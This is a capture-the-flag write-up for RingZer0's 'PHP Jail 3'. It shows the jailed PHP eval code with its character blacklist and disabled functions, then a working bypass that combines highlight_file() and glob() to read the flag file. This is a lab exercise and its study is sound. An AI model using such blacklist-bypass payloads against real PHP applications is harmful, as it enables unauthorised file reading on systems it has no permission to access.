# **PHP Jail 3**

First SSH to the service, password is Flag of `PHP Jail 2` challenge.

```shell=

ubuntu@ubuntu-virtual-machine:~$ ssh level3@challenges.ringzer0team.com -p 10225 

level3@challenges.ringzer0team.com's password:[PHP Jail 2 Flag]

RingZer0 Team Online CTF

PHP Jail Level 3:
Current user is uid=1002(level3) gid=1002(level3) groups=1002(level3)

Flag is located at /home/level3/flag.txt

Challenge PHP code:
-----------------------------

WARNING: the PHP interpreter is launched using php -c php.ini jail.php.
The php.ini file contain "disable_functions=exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,readfile,require,require_once,include,include_once,file"

<?php
array_shift($_SERVER['argv']);
$var = implode(" ", $_SERVER['argv']);

if($var == null) die("PHP Jail need an argument\n");

function filter($var) {
	if(preg_match('/(`|\.|\$|\/|a|c|s|require|include)/i', $var)) {
		return false;
	}
	return true;
}
if(filter($var)) {
	eval($var);
	echo "Command executed";
} else {
	echo "Restricted characters has been used";
}
echo "\n";
?>

-----------------------------
Your input:

```

In warning, there's a lot of functions has been disable, but not `highlight_file()`.

```shell=
Your input:
highlight_file("flag.txt"[0]);
Restricted characters has been used
```

Unfortunately, `flag.txt`'s `a` & `.` is forbidden, let's try another way.

Then we found that `glob()` is allowed.

```shell=
Your input:
highlight_file(glob("fl*txt")[0]);
<code><span style="color: #000000">
FLAG-XXXXXX<br /></span>
</code>Command executed
```